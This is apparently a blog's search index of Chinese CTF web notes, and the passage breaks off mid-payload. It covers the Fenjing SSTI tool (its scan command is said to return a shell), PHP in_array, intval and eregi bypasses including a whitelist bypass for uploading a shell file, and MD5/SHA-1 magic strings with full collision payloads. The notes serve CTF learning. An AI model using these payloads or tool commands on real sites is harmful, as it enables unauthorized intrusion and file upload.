<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>fenjing</title>
    <url>/2024/06/05/fenjing/</url>
    <content><![CDATA[<h2 id="Fenjing-焚靖"><a href="#Fenjing-焚靖" class="headerlink" title="Fenjing(焚靖)"></a>Fenjing(焚靖)</h2><h3 id="fenjing介绍"><a href="#fenjing介绍" class="headerlink" title="fenjing介绍"></a>fenjing介绍</h3><p>&emsp;&emsp;焚靖是一个针对CTF比赛中Jinja2 SSTI绕过WAF的全自动脚本，可以自动攻击给定的网站或接口。能解决常规性的SSTI题目，实用指数⭐⭐⭐</p>
<h3 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a>安装方法</h3><p>&emsp;&emsp;在windows环境下安装最方便，本人尝试在kali安装失败了很多次，各种报错，最后放弃了。&emsp;(；′⌒&#96;)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install fenjing -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>

<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m fenjing scan --url &lt;URL:&gt;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;该命令执行完毕后会反弹一个shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m fenjing webui</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;会在本地弹出一个可视化操作页面，然后在根据要求填充和执行（方便新手去使用）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m fenjing crack --url &lt;URL:&gt; --method GET(POST) --inputs name(user)</span><br></pre></td></tr></table></figure>

<p> &emsp;&emsp;一把梭（说实话还是上面两个命令好用些(／_＼)大怨种）</p>
<p> &emsp;更为详细的在 <a href="https://gitcode.com/Marven11/Fenjing">here</a></p>
]]></content>
      <categories>
        <category>SSTI</category>
      </categories>
      <tags>
        <tag>工具|脚本 利用</tag>
      </tags>
  </entry>
  <entry>
    <title>eregi</title>
    <url>/2024/07/17/eregi/</url>
    <content><![CDATA[<p>&emsp;&emsp;eregi()函数用指定的模式搜索一个字符串中指定的字符串,布尔类型，如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。有两个参数，eregi($pattern,$string),在$string里面搜索$pattern。</p>
<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>&emsp;&emsp;ereg函数存在NULL截断漏洞，即%00截断，可以使用%00绕过验证，例如</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="meta"><span class="keyword">$a</span> = %00hello</span></span><br></pre></td></tr></table></figure>

<h3 id="数组返回值"><a href="#数组返回值" class="headerlink" title="数组返回值"></a>数组返回值</h3><p>&emsp;&emsp;与其他不同的是，该函数若参数为数组是它的返回值不是FALSE，也不会报错。</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>hackbar</title>
    <url>/2024/07/13/hackbar/</url>
    <content><![CDATA[<p>&emsp;&emsp;hackbar是一个用于谷歌和火狐浏览器的扩展插件，可以在浏览器的扩展直接下载添加，然后按F12即可，具体使用方法和操作可以在网上搜一抓一大把，我这里只做一个指路引导的作用。（Ｕ・ω・）⊃<br>&emsp;&emsp; 我们可以通过它进行自定义发送，手动构造GET,POST和COOKIE管理等方法，还具备有URL编码，base64编码，MD5加密 等的能力，还有很多功能等你慢慢沉淀挖掘，实用指数⭐⭐⭐⭐⭐</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>工具|脚本 利用</tag>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title>in_array</title>
    <url>/2024/07/13/in-array/</url>
    <content><![CDATA[<p>&emsp;&emsp;in_array函数的功能用于检查数组是否存在某个值或者是不是数组。定义：布尔型函数，参数为（$needle,$haystack,[$strict &#x3D; FALSE]）,在$haystack中搜索$needle,如果第三个参数$strict的值为TRUE(没有默认为FALSE),则该函数会进行强检查（相等于&#x3D;&#x3D;&#x3D;），检查$needle的类型是否和$haystack中的相同。<font color=red>如果找到$haystack，则返回TRUE,否则返回FALSE。</font></p>
<h3 id="in-array缺陷"><a href="#in-array缺陷" class="headerlink" title="in_array缺陷"></a>in_array缺陷</h3><p>&emsp;&emsp;根据上面所描述的，当该函数没有设置第三个参数的时候，只会进行弱类型比较（相当于&#x3D;&#x3D;），也就是不会检查数据类型，例如<br><img data-src="/images/in_array()%E5%87%BD%E6%95%B0%E7%BC%BA%E9%99%B7.png" alt="in_array"><br>&emsp;&emsp;根据上面白名单规定，只能上传1~24的文件名，因为没有第三个参数，进行弱比较，所以我们上传3shell.php的时候，只要第一个匹配就可以了，从而绕过了白名单，达到了任意文件上传的目的。类似的还有：  </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="number">3</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$whitelist</span> = <span class="title function_ invoke__">range</span>(<span class="number">1</span>,<span class="number">5</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$id</span>,<span class="variable">$whitelist</span>))</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">     <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这里我们有没有设置第三个参数，进行弱类型比较，同样绕过了白名单，这里需要注意的是in_array的返回类型，匹配了返回什么，还有注意前面的！，在preg_match等匹配的时候有常出现，要知道它的作用。</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>intval</title>
    <url>/2024/07/12/intval/</url>
    <content><![CDATA[<p>&emsp;&emsp;intval()函数用来获取变量的整数值，使用的时候常见的有两种情况：<br>&emsp;1.转换整数时，返回整数本身<br>&emsp;2.转换字符串时，会从字符串的开始进行转换，直到遇到一个非数字的字符，如果字符串的第一个字符不是整数，则返回0  </p>
<h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><p>&emsp;如果它的值为一个数组，只要数组里面有值，那么不论值的数量，返回值都为1，空数组则返回0  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$b</span>[]=1;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="built_in">echo</span> intval(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;输出</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Array1</span><br></pre></td></tr></table></figure>

<h3 id="字符串绕过"><a href="#字符串绕过" class="headerlink" title="字符串绕过"></a>字符串绕过</h3><p>&emsp;&emsp;类似于’1000’,’2 or id &#x3D; 1000’的这种带单引号或者有字符的类型，intval()函数会从字符串的开始进行转换，直到遇到非数字的字符，例如第二个转换到or的时候，由于or不是数字类型的字符，从而停止转换，转换的结果就只有2。  </p>
<h3 id="字符串类型-进制绕过"><a href="#字符串类型-进制绕过" class="headerlink" title="字符串类型&amp;进制绕过"></a>字符串类型&amp;进制绕过</h3><p><img data-src="/images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%B1%BB%E5%9E%8B&%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87.png" alt="字符串类型&amp;进制绕过"></p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>md5</title>
    <url>/2024/06/11/md5/</url>
    <content><![CDATA[<p>&emsp;&emsp;MD5绕过是web入门掌握的最基本的知识点，绕过的方法有以下几种</p>
<h3 id="常规的0e绕过"><a href="#常规的0e绕过" class="headerlink" title="常规的0e绕过"></a>常规的0e绕过</h3><p>&emsp;&emsp;在遇到php弱比较两者MD5时，往往使用0e绕过，其原理是利用弱比较（&#x3D;&#x3D;）不对比数据类型，相当于对比第一个数，例如</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span><span class="params">(md5(<span class="variable">$a</span>)</span></span>==<span class="built_in">md5</span>(<span class="variable">$b</span>))</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;要想满足条件，只需要两位的MD5中16位和32位的第一个满足条件就行，下列是一些达到要求的数值</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line"><span class="number">240610708</span></span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;一般做这种题都是用这些数值的，直接选两个复制上去就可以了ƪ(˘⌣˘)ʃ优雅</p>
<h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><p>&emsp;&emsp;在执行md5()函数时，若参数为数组，返回结果是为null，利用这一点，可以使两者都为数组时，结果为null，以达成类型和数据都相等。例如</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">var_dump(<span class="name">md5</span>($_GET[&#x27;a&#x27;]) == md5($_GET[&#x27;b&#x27;]))</span><br><span class="line">if (<span class="name">md5</span>($_GET[&#x27;a&#x27;]) === md5($_GET[&#x27;b&#x27;]))</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;像是这种的，我们就可以利用数组进行绕过（strpos函数也是这样的，我就不单独提出来了，遇到strpos想到数组绕过就行了）</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">a</span><span class="selector-attr">[]</span>=a&amp;<span class="selector-tag">b</span><span class="selector-attr">[]</span>=<span class="selector-tag">b</span> </span><br></pre></td></tr></table></figure>

<h3 id="强类型绕过"><a href="#强类型绕过" class="headerlink" title="强类型绕过"></a>强类型绕过</h3><p>&emsp;&emsp;当判断条件或者让你所输入的参数转换成立string类型的，那么上面的方法都不能用了，例如</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>((<span class="built_in">string</span>)$_POST[<span class="string">&#x27;a&#x27;</span>] !== (<span class="built_in">string</span>)$_POST[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5($_POST[<span class="string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="string">&#x27;b&#x27;</span>]))</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;那么有没有应对之法，当然是有的，payload直接给你啦٩(๑•̀ω•́๑)۶</p>
<figure class="highlight wren"><table><tr><td class="code"><pre><span class="line">$<span class="title class_">Param</span>1<span class="operator">=</span><span class="string">&quot;\x4d\xc9<span class="char escape_">\x68</span>\xff\x0e\xe3\x5c<span class="char escape_">\x20</span><span class="char escape_">\x95</span><span class="char escape_">\x72</span>\xd4<span class="char escape_">\x77</span>\x7b<span class="char escape_">\x72</span><span class="char escape_">\x15</span><span class="char escape_">\x87</span>\xd3\x6f\xa7\xb2\x1b\xdc<span class="char escape_">\x56</span>\xb7\x4a\x3d\xc0<span class="char escape_">\x78</span>\x3e\x7b<span class="char escape_">\x95</span><span class="char escape_">\x18</span>\xaf\xbf\xa2<span class="char escape_">\x00</span>\xa8<span class="char escape_">\x28</span>\x4b\xf3\x6e\x8e\x4b<span class="char escape_">\x55</span>\xb3\x5f<span class="char escape_">\x42</span><span class="char escape_">\x75</span><span class="char escape_">\x93</span>\xd8<span class="char escape_">\x49</span><span class="char escape_">\x67</span>\x6d\xa0\xd1<span class="char escape_">\x55</span>\x5d<span class="char escape_">\x83</span><span class="char escape_">\x60</span>\xfb\x5f<span class="char escape_">\x07</span>\xfe\xa2&quot;</span>;</span><br><span class="line">$<span class="title class_">Param</span>2<span class="operator">=</span><span class="string">&quot;\x4d\xc9<span class="char escape_">\x68</span>\xff\x0e\xe3\x5c<span class="char escape_">\x20</span><span class="char escape_">\x95</span><span class="char escape_">\x72</span>\xd4<span class="char escape_">\x77</span>\x7b<span class="char escape_">\x72</span><span class="char escape_">\x15</span><span class="char escape_">\x87</span>\xd3\x6f\xa7\xb2\x1b\xdc<span class="char escape_">\x56</span>\xb7\x4a\x3d\xc0<span class="char escape_">\x78</span>\x3e\x7b<span class="char escape_">\x95</span><span class="char escape_">\x18</span>\xaf\xbf\xa2<span class="char escape_">\x02</span>\xa8<span class="char escape_">\x28</span>\x4b\xf3\x6e\x8e\x4b<span class="char escape_">\x55</span>\xb3\x5f<span class="char escape_">\x42</span><span class="char escape_">\x75</span><span class="char escape_">\x93</span>\xd8<span class="char escape_">\x49</span><span class="char escape_">\x67</span>\x6d\xa0\xd1\xd5\x5d<span class="char escape_">\x83</span><span class="char escape_">\x60</span>\xfb\x5f<span class="char escape_">\x07</span>\xfe\xa2&quot;</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight wren"><table><tr><td class="code"><pre><span class="line">$<span class="variable">data1</span><span class="operator">=</span><span class="string">&quot;\xd1<span class="char escape_">\x31</span>\xdd<span class="char escape_">\x02</span>\xc5\xe6\xee\xc4<span class="char escape_">\x69</span>\x3d\x9a<span class="char escape_">\x06</span><span class="char escape_">\x98</span>\xaf\xf9\x5c\x2f\xca\xb5<span class="char escape_">\x07</span><span class="char escape_">\x12</span><span class="char escape_">\x46</span>\x7e\xab<span class="char escape_">\x40</span><span class="char escape_">\x04</span><span class="char escape_">\x58</span>\x3e\xb8\xfb\x7f<span class="char escape_">\x89</span><span class="char escape_">\x55</span>\xad<span class="char escape_">\x34</span><span class="char escape_">\x06</span><span class="char escape_">\x09</span>\xf4\xb3<span class="char escape_">\x02</span><span class="char escape_">\x83</span>\xe4<span class="char escape_">\x88</span><span class="char escape_">\x83</span><span class="char escape_">\x25</span>\xf1<span class="char escape_">\x41</span>\x5a<span class="char escape_">\x08</span><span class="char escape_">\x51</span><span class="char escape_">\x25</span>\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd<span class="char escape_">\x72</span><span class="char escape_">\x80</span><span class="char escape_">\x37</span>\x3c\x5b\xd8<span class="char escape_">\x82</span>\x3e<span class="char escape_">\x31</span><span class="char escape_">\x56</span><span class="char escape_">\x34</span>\x8f\x5b\xae\x6d\xac\xd4<span class="char escape_">\x36</span>\xc9<span class="char escape_">\x19</span>\xc6\xdd<span class="char escape_">\x53</span>\xe2<span class="char escape_">\x34</span><span class="char escape_">\x87</span>\xda<span class="char escape_">\x03</span>\xfd<span class="char escape_">\x02</span><span class="char escape_">\x39</span><span class="char escape_">\x63</span><span class="char escape_">\x06</span>\xd2<span class="char escape_">\x48</span>\xcd\xa0\xe9\x9f<span class="char escape_">\x33</span><span class="char escape_">\x42</span>\x0f<span class="char escape_">\x57</span>\x7e\xe8\xce<span class="char escape_">\x54</span>\xb6<span class="char escape_">\x70</span><span class="char escape_">\x80</span><span class="char escape_">\x28</span>\x0d\x1e\xc6<span class="char escape_">\x98</span><span class="char escape_">\x21</span>\xbc\xb6\xa8<span class="char escape_">\x83</span><span class="char escape_">\x93</span><span class="char escape_">\x96</span>\xf9<span class="char escape_">\x65</span>\xab\x6f\xf7\x2a<span class="char escape_">\x70</span>&quot;</span>;</span><br><span class="line">$<span class="variable">data2</span><span class="operator">=</span><span class="string">&quot;\xd1<span class="char escape_">\x31</span>\xdd<span class="char escape_">\x02</span>\xc5\xe6\xee\xc4<span class="char escape_">\x69</span>\x3d\x9a<span class="char escape_">\x06</span><span class="char escape_">\x98</span>\xaf\xf9\x5c\x2f\xca\xb5<span class="char escape_">\x87</span><span class="char escape_">\x12</span><span class="char escape_">\x46</span>\x7e\xab<span class="char escape_">\x40</span><span class="char escape_">\x04</span><span class="char escape_">\x58</span>\x3e\xb8\xfb\x7f<span class="char escape_">\x89</span><span class="char escape_">\x55</span>\xad<span class="char escape_">\x34</span><span class="char escape_">\x06</span><span class="char escape_">\x09</span>\xf4\xb3<span class="char escape_">\x02</span><span class="char escape_">\x83</span>\xe4<span class="char escape_">\x88</span><span class="char escape_">\x83</span><span class="char escape_">\x25</span><span class="char escape_">\x71</span><span class="char escape_">\x41</span>\x5a<span class="char escape_">\x08</span><span class="char escape_">\x51</span><span class="char escape_">\x25</span>\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\xf2<span class="char escape_">\x80</span><span class="char escape_">\x37</span>\x3c\x5b\xd8<span class="char escape_">\x82</span>\x3e<span class="char escape_">\x31</span><span class="char escape_">\x56</span><span class="char escape_">\x34</span>\x8f\x5b\xae\x6d\xac\xd4<span class="char escape_">\x36</span>\xc9<span class="char escape_">\x19</span>\xc6\xdd<span class="char escape_">\x53</span>\xe2\xb4<span class="char escape_">\x87</span>\xda<span class="char escape_">\x03</span>\xfd<span class="char escape_">\x02</span><span class="char escape_">\x39</span><span class="char escape_">\x63</span><span class="char escape_">\x06</span>\xd2<span class="char escape_">\x48</span>\xcd\xa0\xe9\x9f<span class="char escape_">\x33</span><span class="char escape_">\x42</span>\x0f<span class="char escape_">\x57</span>\x7e\xe8\xce<span class="char escape_">\x54</span>\xb6<span class="char escape_">\x70</span><span class="char escape_">\x80</span>\xa8\x0d\x1e\xc6<span class="char escape_">\x98</span><span class="char escape_">\x21</span>\xbc\xb6\xa8<span class="char escape_">\x83</span><span class="char escape_">\x93</span><span class="char escape_">\x96</span>\xf9<span class="char escape_">\x65</span>\x2b\x6f\xf7\x2a<span class="char escape_">\x70</span>&quot;</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">array<span class="number">1</span><span class="operator">=</span>M<span class="variable">%C9h</span><span class="variable">%FF</span><span class="variable">%0</span>E<span class="variable">%E3</span><span class="variable">%5</span>C<span class="variable">%20</span><span class="variable">%95</span>r<span class="variable">%D4w</span><span class="variable">%7</span>Br<span class="variable">%15</span><span class="variable">%87</span><span class="variable">%D3o</span><span class="variable">%A7</span><span class="variable">%B2</span><span class="variable">%1</span>B<span class="variable">%DCV</span><span class="variable">%B7J</span><span class="variable">%3</span>D<span class="variable">%C0x</span><span class="variable">%3</span>E<span class="variable">%7</span>B<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%AF</span><span class="variable">%BF</span><span class="variable">%A2</span><span class="variable">%00</span><span class="variable">%A8</span><span class="variable">%28</span>K<span class="variable">%F3n</span><span class="variable">%8</span>EKU<span class="variable">%B3_Bu</span><span class="variable">%93</span><span class="variable">%D8Igm</span><span class="variable">%A0</span><span class="variable">%D1U</span><span class="variable">%5</span>D<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%FB_</span><span class="variable">%07</span><span class="variable">%FE</span><span class="variable">%A2</span>&amp;</span><br><span class="line">array<span class="number">2</span><span class="operator">=</span>M<span class="variable">%C9h</span><span class="variable">%FF</span><span class="variable">%0</span>E<span class="variable">%E3</span><span class="variable">%5</span>C<span class="variable">%20</span><span class="variable">%95</span>r<span class="variable">%D4w</span><span class="variable">%7</span>Br<span class="variable">%15</span><span class="variable">%87</span><span class="variable">%D3o</span><span class="variable">%A7</span><span class="variable">%B2</span><span class="variable">%1</span>B<span class="variable">%DCV</span><span class="variable">%B7J</span><span class="variable">%3</span>D<span class="variable">%C0x</span><span class="variable">%3</span>E<span class="variable">%7</span>B<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%AF</span><span class="variable">%BF</span><span class="variable">%A2</span><span class="variable">%02</span><span class="variable">%A8</span><span class="variable">%28</span>K<span class="variable">%F3n</span><span class="variable">%8</span>EKU<span class="variable">%B3_Bu</span><span class="variable">%93</span><span class="variable">%D8Igm</span><span class="variable">%A0</span><span class="variable">%D1</span><span class="variable">%D5</span><span class="variable">%5</span>D<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%FB_</span><span class="variable">%07</span><span class="variable">%FE</span><span class="variable">%A2</span></span><br><span class="line"></span><br><span class="line">array<span class="number">1</span><span class="operator">=</span><span class="variable">%4</span>d<span class="variable">%c9</span><span class="variable">%68</span><span class="variable">%ff</span><span class="variable">%0</span>e<span class="variable">%e3</span><span class="variable">%5</span><span class="keyword">c</span><span class="variable">%20</span><span class="variable">%95</span><span class="variable">%72</span><span class="variable">%d4</span><span class="variable">%77</span><span class="variable">%7</span>b<span class="variable">%72</span><span class="variable">%15</span><span class="variable">%87</span><span class="variable">%d3</span><span class="variable">%6</span>f<span class="variable">%a7</span><span class="variable">%b2</span><span class="variable">%1</span>b<span class="variable">%dc</span><span class="variable">%56</span><span class="variable">%b7</span><span class="variable">%4</span>a<span class="variable">%3</span>d<span class="variable">%c0</span><span class="variable">%78</span><span class="variable">%3</span>e<span class="variable">%7</span>b<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%af</span><span class="variable">%bf</span><span class="variable">%a2</span><span class="variable">%00</span><span class="variable">%a8</span><span class="variable">%28</span><span class="variable">%4</span>b<span class="variable">%f3</span><span class="variable">%6</span>e<span class="variable">%8</span>e<span class="variable">%4</span>b<span class="variable">%55</span><span class="variable">%b3</span><span class="variable">%5</span>f<span class="variable">%42</span><span class="variable">%75</span><span class="variable">%93</span><span class="variable">%d8</span><span class="variable">%49</span><span class="variable">%67</span><span class="variable">%6</span>d<span class="variable">%a0</span><span class="variable">%d1</span><span class="variable">%55</span><span class="variable">%5</span>d<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%fb</span><span class="variable">%5</span>f<span class="variable">%07</span><span class="variable">%fe</span><span class="variable">%a2</span>&amp;</span><br><span class="line">array<span class="number">2</span><span class="operator">=</span><span class="variable">%4</span>d<span class="variable">%c9</span><span class="variable">%68</span><span class="variable">%ff</span><span class="variable">%0</span>e<span class="variable">%e3</span><span class="variable">%5</span><span class="keyword">c</span><span class="variable">%20</span><span class="variable">%95</span><span class="variable">%72</span><span class="variable">%d4</span><span class="variable">%77</span><span class="variable">%7</span>b<span class="variable">%72</span><span class="variable">%15</span><span class="variable">%87</span><span class="variable">%d3</span><span class="variable">%6</span>f<span class="variable">%a7</span><span class="variable">%b2</span><span class="variable">%1</span>b<span class="variable">%dc</span><span class="variable">%56</span><span class="variable">%b7</span><span class="variable">%4</span>a<span class="variable">%3</span>d<span class="variable">%c0</span><span class="variable">%78</span><span class="variable">%3</span>e<span class="variable">%7</span>b<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%af</span><span class="variable">%bf</span><span class="variable">%a2</span><span class="variable">%02</span><span class="variable">%a8</span><span class="variable">%28</span><span class="variable">%4</span>b<span class="variable">%f3</span><span class="variable">%6</span>e<span class="variable">%8</span>e<span class="variable">%4</span>b<span class="variable">%55</span><span class="variable">%b3</span><span class="variable">%5</span>f<span class="variable">%42</span><span class="variable">%75</span><span class="variable">%93</span><span class="variable">%d8</span><span class="variable">%49</span><span class="variable">%67</span><span class="variable">%6</span>d<span class="variable">%a0</span><span class="variable">%d1</span><span class="variable">%d5</span><span class="variable">%5</span>d<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%fb</span><span class="variable">%5</span>f<span class="variable">%07</span><span class="variable">%fe</span><span class="variable">%a2</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;喜欢哪个用哪个（我个人常用第三个）</p>
<h3 id="弱比较等于自身"><a href="#弱比较等于自身" class="headerlink" title="弱比较等于自身"></a>弱比较等于自身</h3><p>&emsp;&emsp;有这么两个字符串，它的弱比较等于自身，我们称它们为奇妙的字符串，当遇到这种情况时，我们通常使用它们</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>==<span class="built_in">md5</span>(<span class="variable">$a</span>)</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;它们就是</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">Ffifdyop</span><br><span class="line"><span class="number">0e215962017</span></span><br></pre></td></tr></table></figure>

<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>&emsp;&emsp;对于需要两个内容不同但是MD5值相同的文件，使用Fastcoll工具就可以了<a href="https://blog.csdn.net/m0_73683234/article/details/137245586">Fastcoll</a></p>
<h3 id="sha1绕过"><a href="#sha1绕过" class="headerlink" title="sha1绕过"></a>sha1绕过</h3><p>&emsp;&emsp;和md5()函数是一样的原理，就弱比较的字符串和遇到string的情况不一样罢了，这里一次性放出来</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line"><span class="number">10932435112</span>: <span class="number">0</span>e0776691500413317634705586<span class="number">5026311692244</span></span><br><span class="line">aaroZmOk: <span class="number">0</span>e66507019969427134894567494<span class="number">305185566735</span></span><br><span class="line">aaK1STfY: <span class="number">0</span>e766585266557562076882711596<span class="number">24026011393</span></span><br><span class="line">aaO8zKZF: <span class="number">0</span>e89257456677279068558073954<span class="number">252716165668</span></span><br><span class="line">aa3OFF9m: <span class="number">0</span>e369777862785179849592603940<span class="number">24281014729</span></span><br><span class="line"><span class="number">0</span>e<span class="number">1290633704</span>: <span class="number">0</span>e19985187802402577070739524<span class="number">195726831799</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;遇到string的情况</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">array<span class="number">1</span><span class="operator">=</span><span class="variable">%25</span>PDF<span class="number">-1.3</span><span class="variable">%0</span>A<span class="variable">%25</span><span class="variable">%E2</span><span class="variable">%E3</span><span class="variable">%CF</span><span class="variable">%D3</span><span class="variable">%0</span>A<span class="variable">%0</span>A<span class="variable">%0</span>A<span class="number">1</span><span class="variable">%200</span><span class="variable">%20</span>obj<span class="variable">%0</span>A<span class="variable">%3</span>C<span class="variable">%3</span>C/Width<span class="variable">%202</span><span class="variable">%200</span><span class="variable">%20</span>R/Height<span class="variable">%203</span><span class="variable">%200</span><span class="variable">%20</span>R/Type<span class="variable">%204</span><span class="variable">%200</span><span class="variable">%20</span>R/Subtype<span class="variable">%205</span><span class="variable">%200</span><span class="variable">%20</span>R/Filter<span class="variable">%206</span><span class="variable">%200</span><span class="variable">%20</span>R/ColorSpace<span class="variable">%207</span><span class="variable">%200</span><span class="variable">%20</span>R/Length<span class="variable">%208</span><span class="variable">%200</span><span class="variable">%20</span>R/BitsPerComponent<span class="variable">%208</span><span class="variable">%3</span>E<span class="variable">%3</span>E<span class="variable">%0</span>Astream<span class="variable">%0</span>A<span class="variable">%FF</span><span class="variable">%D8</span><span class="variable">%FF</span><span class="variable">%FE</span><span class="variable">%00</span><span class="variable">%24</span>SHA<span class="number">-1</span><span class="variable">%20</span>is<span class="variable">%20</span>dead<span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%85</span>/<span class="variable">%EC</span><span class="variable">%09</span><span class="variable">%239</span>u<span class="variable">%9</span>C<span class="number">9</span><span class="variable">%B1</span><span class="variable">%A1</span><span class="variable">%C6</span><span class="variable">%3</span>CL<span class="variable">%97</span><span class="variable">%E1</span><span class="variable">%FF</span><span class="variable">%FE</span><span class="variable">%01</span><span class="variable">%7</span>FF<span class="variable">%DC</span><span class="variable">%93</span><span class="variable">%A6</span><span class="variable">%B6</span><span class="variable">%7</span>E<span class="variable">%01</span><span class="variable">%3</span>B<span class="variable">%02</span><span class="variable">%9</span>A<span class="variable">%AA</span><span class="variable">%1</span>D<span class="variable">%B2V</span><span class="variable">%0</span>BE<span class="variable">%CAg</span><span class="variable">%D6</span><span class="variable">%88</span><span class="variable">%C7</span><span class="variable">%F8K</span><span class="variable">%8</span>CLy<span class="variable">%1</span>F<span class="variable">%E0</span><span class="variable">%2</span>B<span class="variable">%3</span>D<span class="variable">%F6</span><span class="variable">%14</span><span class="variable">%F8m</span><span class="variable">%B1i</span><span class="variable">%09</span><span class="variable">%01</span><span class="variable">%C5kE</span><span class="variable">%C1S</span><span class="variable">%0</span>A<span class="variable">%FE</span><span class="variable">%DF</span><span class="variable">%B7</span><span class="variable">%608</span><span class="variable">%E9rr</span>/<span class="variable">%E7</span><span class="variable">%ADr</span><span class="variable">%8</span>F<span class="variable">%0</span>EI<span class="variable">%04</span><span class="variable">%E0F</span><span class="variable">%C20W</span><span class="variable">%0</span>F<span class="variable">%E9</span><span class="variable">%D4</span><span class="variable">%13</span><span class="variable">%98</span><span class="variable">%AB</span><span class="variable">%E1.</span><span class="variable">%F5</span><span class="variable">%BC</span><span class="variable">%94</span><span class="variable">%2</span>B<span class="variable">%E35B</span><span class="variable">%A4</span><span class="variable">%80</span>-<span class="variable">%98</span><span class="variable">%B5</span><span class="variable">%D7</span><span class="variable">%0</span>F<span class="variable">%2</span>A<span class="number">3</span>.<span class="variable">%C3</span><span class="variable">%7</span>F<span class="variable">%AC5</span><span class="variable">%14</span><span class="variable">%E7M</span><span class="variable">%DC</span><span class="variable">%0</span>F<span class="variable">%2</span>C<span class="variable">%C1</span><span class="variable">%A8t</span><span class="variable">%CD</span><span class="variable">%0</span>Cx<span class="number">0</span>Z<span class="variable">%21</span>Vda<span class="number">0</span><span class="variable">%97</span><span class="variable">%89</span><span class="variable">%60</span>k<span class="variable">%D0</span><span class="variable">%BF</span><span class="variable">%3</span>F<span class="variable">%98</span><span class="variable">%CD</span><span class="variable">%A8</span><span class="variable">%04</span>F<span class="variable">%29</span><span class="variable">%A1</span></span><br><span class="line"></span><br><span class="line">array<span class="number">2</span><span class="operator">=</span><span class="variable">%25</span>PDF<span class="number">-1.3</span><span class="variable">%0</span>A<span class="variable">%25</span><span class="variable">%E2</span><span class="variable">%E3</span><span class="variable">%CF</span><span class="variable">%D3</span><span 